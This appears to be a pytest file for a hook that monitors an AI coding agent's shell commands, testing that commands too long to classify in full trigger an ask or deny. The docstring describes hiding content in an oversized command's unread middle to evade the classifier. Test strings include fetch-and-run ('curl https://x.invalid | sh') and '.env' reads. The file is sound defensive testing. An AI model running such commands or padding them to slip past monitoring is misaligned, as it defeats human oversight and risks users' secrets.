"""Block mode asks on a command too large to classify in full (#348).

Past CLASSIFY_MAX_LEN the hook classifies the head and the tail and skips the
middle. That is a detection bound, and in block mode it meant a command built
to hide something in the middle was allowed without being read. A security check should fail closed on what it cannot read, so the
event now says the classification was partial, and block mode turns that into
an ask, or a deny where the agent would ignore an ask.
"""

from __future__ import annotations

import json
import time
from types import SimpleNamespace

import pytest

from agentmetry.core.audit.external import build_external_canonical
from agentmetry.hooks import ingest

_OVERSIZED = "echo filler\n" * (ingest.CLASSIFY_MAX_LEN // 12 + 100)


def _call(command: str) -> dict:
    return {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": command}}


@pytest.fixture
def run_hook(monkeypatch, capsys):
    posted: list[dict] = []
    monkeypatch.setattr(ingest, "_read_repo_env", lambda _key: "")
    monkeypatch.setattr(ingest, "post_ingest", lambda payload, **k: posted.append(dict(payload)) or True)
    monkeypatch.setattr(ingest, "dlp_scan", lambda *a, **k: SimpleNamespace(matched=False))
    monkeypatch.delenv("AGENTMETRY_ENFORCE", raising=False)

    def _run(source: str, hook: str, data: dict, *, mode: str = "block", verdict: dict | None = None):
        monkeypatch.setenv("AGENTMETRY_SOURCE_APP", source)
        fields = {"matched": False, "blocked": False, "ask": False, "match": None, **(verdict or {})}
        monkeypatch.setattr(ingest, "tool_policy_eval", lambda *a, **k: SimpleNamespace(mode=mode, **fields))
        monkeypatch.setattr(ingest, "read_hook_stdin", lambda: (data, False))
        posted.clear()
        ingest.hook_main(hook)
        out = capsys.readouterr().out.strip()
        return (json.loads(out.splitlines()[-1]) if out else None), posted

    return _run


def test_an_oversized_command_is_marked_partial():
    payload = ingest._hash_tool_args({
        "source_app": "claude", "event_type": "tool_called",
        "tool": {"qualified": "Bash", "arguments": {"command": _OVERSIZED}},
    })
    assert payload["tool"]["classification"] == "partial"
    assert build_external_canonical(payload)["tool"]["classification"] == "partial"


def test_a_command_within_the_bound_is_not_marked():
    command = ("echo filler " * (ingest.CLASSIFY_MAX_LEN // 12))[: ingest.CLASSIFY_MAX_LEN]
    payload = ingest._hash_tool_args({
        "source_app": "claude", "event_type": "tool_called",
        "tool": {"qualified": "Bash", "arguments": {"command": command}},
    })
    assert "classification" not in payload["tool"]
    assert "classification" not in build_external_canonical(payload)["tool"]


def test_block_mode_asks_on_a_partial_classification(run_hook):
    out, posted = run_hook("claude", "PreToolUse", _call(_OVERSIZED))
    assert out["hookSpecificOutput"]["permissionDecision"] == "ask"
    assert posted[-1]["event_type"] == "approval_request"
    assert posted[-1]["outcome"] == "pending"
    assert posted[-1]["reason"] == "tool_policy:classification_partial"


def test_an_allow_rule_does_not_waive_the_ask(run_hook):
    """The pattern matched the first line; the middle is still unread."""
    allow = {"matched": True, "match": SimpleNamespace(rule_id="allow_echo", action="allow")}
    out, _ = run_hook("claude", "PreToolUse", _call(_OVERSIZED), verdict=allow)
    assert out["hookSpecificOutput"]["permissionDecision"] == "ask"


def test_a_deny_rule_still_wins(run_hook):
    deny = {"matched": True, "blocked": True, "match": SimpleNamespace(rule_id="no_echo", action="deny")}
    out, posted = run_hook("claude", "PreToolUse", _call(_OVERSIZED), verdict=deny)
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert posted[-1]["reason"] == "tool_policy:no_echo"


def test_where_an_ask_is_ignored_it_is_a_deny(run_hook):
    out, posted = run_hook("qwen", "PreToolUse", _call(_OVERSIZED))
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert posted[-1]["outcome"] == "denied"
    assert "ask_unsupported:qwen/PreToolUse" in posted[-1]["reason"]


def test_log_mode_records_but_never_prompts(run_hook):
    out, posted = run_hook("claude", "PreToolUse", _call(_OVERSIZED), mode="log")
    assert out is None
    assert posted[-1]["tool"]["classification"] == "partial"
    assert "classification_partial" not in posted[-1].get("reason", "")


def test_an_after_hook_claims_nothing(run_hook):
    out, posted = run_hook("claude", "PostToolUse", {**_call(_OVERSIZED), "exit_code": 0})
    assert out is None
    assert posted[-1]["tool"]["classification"] == "partial"


def test_an_ordinary_command_in_block_mode_is_untouched(run_hook):
    out, posted = run_hook("claude", "PreToolUse", _call("ls -la"))
    assert out is None
    assert "classification" not in posted[-1]["tool"]


# --- long runs: the quadratic patterns in the frozen files --------------------
#
# ENV_FILE and PRIVATE_KEY_PATH open with an unanchored `[\w.~$-]*[/\\]`. On one
# long run with no slash that is quadratic: 16 KiB took 4.7 s per pass, so at
# 0.10.3's 64 KiB bound one token outlasted the agent's hook timeout.


def test_no_run_reaches_the_classifier_longer_than_the_bound():
    text, partial = ingest._classification_text("cat " + "a" * 10_000 + " | sh")
    assert partial
    assert max(len(r) for r in ingest._PATHLIKE_RUN.findall(text)) <= ingest.CLASSIFY_MAX_RUN
    assert text.startswith("cat ") and text.endswith(" | sh")


def test_a_run_keeps_the_end_that_touches_a_path():
    text, _ = ingest._classification_text("cat " + "a" * 10_000 + "/.env")
    assert text.endswith("a/.env")


def test_ordinary_words_are_untouched():
    command = "git commit -m 'fix the thing' && npm test -- --runInBand"
    assert ingest._classification_text(command) == (command, False)


@pytest.mark.parametrize(
    "token", ["x", "a.", "-", "~", "$x", "9", "\n", " \n", "\t", "printenv ", "iwr ", "curl "]
)
def test_a_megabyte_token_classifies_in_bounded_time(token):
    command = token * (1_048_576 // len(token))
    started = time.perf_counter()
    payload = ingest._hash_tool_args({
        "source_app": "claude", "event_type": "tool_called",
        "tool": {"qualified": "Bash", "arguments": {"command": command}},
    })
    # Generous, so CI noise cannot fail it. Before the bound this was minutes.
    assert time.perf_counter() - started < 10
    assert payload["tool"]["classification"] == "partial"


def test_structured_arguments_are_bounded_too():
    """No command and no path key: the MITRE mapper reads the arguments."""
    started = time.perf_counter()
    payload = ingest._hash_tool_args({
        "source_app": "claude", "event_type": "tool_called",
        "tool": {"qualified": "srv.upload", "arguments": {"file": "x" * 1_048_576}},
    })
    assert time.perf_counter() - started < 10
    assert payload["tool"]["classification"] == "partial"


def test_bounded_evidence_shares_one_budget():
    args = {"a": "x " * 40_000, "b": ["y " * 40_000], "n": 3}
    bounded, partial = ingest._bounded_evidence(args)
    assert partial
    assert bounded["n"] == 3
    assert len(bounded["a"]) + len(bounded["b"][0]) <= ingest.CLASSIFY_MAX_LEN


def test_small_structured_arguments_are_not_marked():
    payload = ingest._hash_tool_args({
        "source_app": "claude", "event_type": "tool_called",
        "tool": {"qualified": "srv.search", "arguments": {"query": "release notes"}},
    })
    assert "classification" not in payload["tool"]


def test_a_whitespace_run_keeps_its_line_structure_and_is_not_partial():
    command = "echo a" + "\n" * 5000 + "    cat .env"
    text, partial = ingest._classification_text(command)
    assert not partial
    assert text == "echo a\n\n    cat .env"


def test_a_long_run_of_spaces_is_one_separator():
    text, partial = ingest._classification_text("curl" + " " * 5000 + "https://x.invalid | sh")
    assert not partial
    assert text == "curl" + " " * ingest.CLASSIFY_MAX_RUN + "https://x.invalid | sh"
